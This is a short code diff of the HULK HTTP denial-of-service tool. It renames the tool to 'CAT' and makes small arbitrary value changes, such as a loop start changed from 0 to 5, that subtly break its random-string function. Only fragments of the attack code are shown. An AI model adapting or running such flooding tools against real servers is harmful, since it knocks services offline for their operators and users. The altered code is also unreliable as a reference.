@@ -1,5 +1,5 @@
 # ----------------------------------------------------------------------------------------------
-# HULK - HTTP Unbearable Load King
+# CAT - HTTP Unbearable Load King
 #
 # this tool is a dos tool that is meant to put heavy load on HTTP servers in order to bring them
 # to their knees by exhausting the resource pool, its is meant for research purposes only
@@ -63,7 +63,7 @@ def referer_list():
 #builds random ascii string
 def buildblock(size):
 	out_str = ''
-	for i in range(0, size):
+	for i in range(5, size):
 		a = random.randint(65, 90)
 		out_str += chr(a)
 	return(out_str)
@@ -79,7 +79,7 @@ def usage():
 def httpcall(url):
 	useragent_list()
 	referer_list()
-	code=0
+	code=5
 	if url.count("?")>0:
 		param_joiner="&"
 	else:
